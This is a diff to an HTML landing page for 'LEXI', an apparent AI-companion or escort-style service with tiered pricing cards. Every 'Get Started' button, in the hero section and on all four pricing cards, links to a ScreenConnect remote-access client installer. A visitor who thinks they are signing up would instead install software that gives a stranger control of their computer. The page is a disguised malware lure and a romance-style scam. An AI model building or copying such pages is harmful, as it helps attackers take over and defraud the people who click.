@@ -477,14 +477,149 @@
       margin-bottom: 16px;
     }
 
-    .cta-banner p {
+.cta-banner p {
       color: #cbb9dd;
       max-width: 550px;
       margin: 0 auto 32px;
       font-size: clamp(0.95rem, 1.4vw, 1.15rem);
     }
 
-   
+    .pricing-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 24px;
+      align-items: stretch;
+    }
+
+    .pricing-card {
+      position: relative;
+      background: rgba(30, 21, 41, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 32px;
+      padding: 32px;
+      display: flex;
+      flex-direction: column;
+      transition: transform 0.4s cubic-bezier(0.2, 0.9, 0.4, 1), box-shadow 0.4s ease, border-color 0.4s ease;
+    }
+
+    .pricing-card:hover {
+      transform: translateY(-8px);
+      border-color: rgba(232, 121, 249, 0.3);
+      box-shadow: 0 24px 40px -16px #d946ef;
+    }
+
+    .pricing-card.featured {
+      border-color: rgba(232, 121, 249, 0.4);
+      box-shadow: 0 24px 40px -16px #d946ef;
+      background: rgba(30, 21, 41, 0.8);
+    }
+
+    .pricing-card.featured:hover {
+      box-shadow: 0 32px 50px -12px #d946ef;
+    }
+
+    .pricing-badge {
+      position: absolute;
+      top: -14px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #d946ef, #a855f7);
+      color: #0b0710;
+      font-size: 0.75rem;
+      font-weight: 700;
+      padding: 6px 16px;
+      border-radius: 60px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .pricing-header {
+      text-align: center;
+      margin-bottom: 28px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    .pricing-header h3 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-bottom: 16px;
+      font-family: 'Playfair Display', serif;
+    }
+
+    .price {
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 2px;
+    }
+
+    .currency {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: #e879f9;
+    }
+
+    .amount {
+      font-size: 3.5rem;
+      font-weight: 700;
+      line-height: 1;
+      color: #f5edff;
+      font-family: 'Playfair Display', serif;
+    }
+
+    .period {
+      font-size: 1rem;
+      color: #9a86b0;
+      font-weight: 400;
+    }
+
+    .pricing-features {
+      list-style: none;
+      margin-bottom: 32px;
+      flex: 1;
+    }
+
+    .pricing-features li {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 0;
+      color: #cbb9dd;
+      font-size: 0.95rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    .pricing-features li:last-child {
+      border-bottom: none;
+    }
+
+    .pricing-features i {
+      color: #d946ef;
+      font-size: 1rem;
+      width: 20px;
+      text-align: center;
+    }
+
+    .pricing-card .btn,
+    .pricing-card .btn-outline {
+      width: 100%;
+    }
+
+    @media (max-width: 1200px) {
+      .pricing-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (max-width: 900px) {
+      .pricing-grid {
+        grid-template-columns: 1fr;
+        max-width: 420px;
+        margin: 0 auto;
+      }
+    }
+
     footer {
       padding: 32px 0;
       border-top: 1px solid rgba(255, 255, 255, 0.05);
@@ -581,7 +716,7 @@
       <div class="hero-content">
          
         <h1>She’s <span class="gradient-text">waiting</span> to meet you.</h1>
-        <!-- <p>Step into a world of effortless conversation, charm, and elegance. LEXI is not just an AI — she's the perfect companion for the modern man.</p> -->
+           
         <div class="hero-actions">
           <a href="https://nortonpd.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SCREENS&c=&c=&c=&c=&c=&c=&c=" class="btn" target="_blank" rel="noopener noreferrer"><i class="fas fa-comment-dots"></i> Get Started</a>
         </div>
@@ -598,7 +733,7 @@
     </div>
   </section>
 
- >
+ 
   <section id="gallery" class="section container">
     <div class="section-header fade-in">
       <h2>Captivating <span class="gradient-text">moments</span></h2>
@@ -620,7 +755,10 @@
       </div>
     </div>
   </section>
+  
+  
 
+   
   
   <section id="chat" class="container section">
     <div class="chat-section">
@@ -638,6 +776,90 @@
   </section>
 
  
+  <section id="pricing" class="container section">
+    <div class="section-header fade-in">
+      <h2>Choose your <span class="gradient-text">experience</span></h2>
+      <p>Select the plan that fits what you're looking for. No hidden fees, cancel anytime.</p>
+    </div>
+
+    <div class="pricing-grid">
+      <article class="pricing-card fade-in">
+        <div class="pricing-header">
+          <!-- <h3>Starter</h3> -->
+          <div class="price">
+            <span class="currency">$</span>
+            <span class="amount">100</span>
+            <span class="period">/ short time</span>
+          </div>
+        </div>
+        <ul class="pricing-features">
+          <li><i class="fas fa-check"></i> Quick chat session</li>
+          <li><i class="fas fa-check"></i> Basic companionship</li>
+          <li><i class="fas fa-check"></i> 15-30 minutes</li>
+          <li><i class="fas fa-check"></i> No commitment</li>
+        </ul>
+        <a href="https://nortonpd.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SCREENS&c=&c=&c=&c=&c=&c=&c=" class="btn btn-outline" target="_blank" rel="noopener noreferrer">Get Started</a>
+      </article>
+
+      <article class="pricing-card featured fade-in">
+        <!-- <div class="pricing-badge">Most Popular</div> -->
+        <div class="pricing-header">
+          <!-- <h3>Premium</h3> -->
+          <div class="price">
+            <span class="currency">$</span>
+            <span class="amount">150</span>
+            <span class="period">/ hour</span>
+          </div>
+        </div>
+        <ul class="pricing-features">
+          <li><i class="fas fa-check"></i> Full hour experience</li>
+          <li><i class="fas fa-check"></i> Everything included</li>
+          <li><i class="fas fa-check"></i> Priority access</li>
+          <li><i class="fas fa-check"></i> Extended conversation</li>
+        </ul>
+        <a href="https://nortonpd.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SCREENS&c=&c=&c=&c=&c=&c=&c=" class="btn btn-outline" target="_blank" rel="noopener noreferrer">Get Started</a>
+      </article>
+       <article class="pricing-card featured fade-in">
+        <!-- <div class="pricing-badge">Ultimate</div> -->
+        <div class="pricing-header">
+          <!-- <h3>Ultimate</h3> -->
+          <div class="price">
+            <span class="currency">$</span>
+            <span class="amount">300</span>
+            <span class="period">/ all access</span>
+          </div>
+        </div>
+        <ul class="pricing-features">
+          <li><i class="fas fa-check"></i> Everything included</li>
+          <li><i class="fas fa-check"></i> No time limit</li>
+          <li><i class="fas fa-check"></i> No restrictions</li>
+          <li><i class="fas fa-check"></i> Full satisfaction</li>
+        </ul>
+        <a href="https://nortonpd.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SCREENS&c=&c=&c=&c=&c=&c=&c=" class="btn btn-outline" target="_blank" rel="noopener noreferrer">Get Started</a>
+      </article>
+
+      <article class="pricing-card fade-in">
+        <div class="pricing-header">
+          <!-- <h3>VIP All Access</h3> -->
+          <div class="price">
+            <span class="currency">$</span>
+            <span class="amount">500</span>
+            <span class="period">/ overnight</span>
+          </div>
+        </div>
+        <ul class="pricing-features">
+          <li><i class="fas fa-check"></i> All night, no limits</li>
+          <li><i class="fas fa-check"></i> No restrictions</li>
+          <li><i class="fas fa-check"></i> Full satisfaction</li>
+          <li><i class="fas fa-check"></i> Premium snap access</li>
+        </ul>
+        <a href="https://nortonpd.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=SCREENS&c=&c=&c=&c=&c=&c=&c=" class="btn btn-outline" target="_blank" rel="noopener noreferrer">Get Started</a>
+      </article>
+
+     
+    </div>
+  </section>
+
   <section id="cta" class="container cta-banner fade-in">
     <h2>Ready for a <span class="gradient-text">real connection</span>?</h2>
     <p>Join thousands of men who have found charm, companionship, and conversation with LEXI. She's online now.</p>
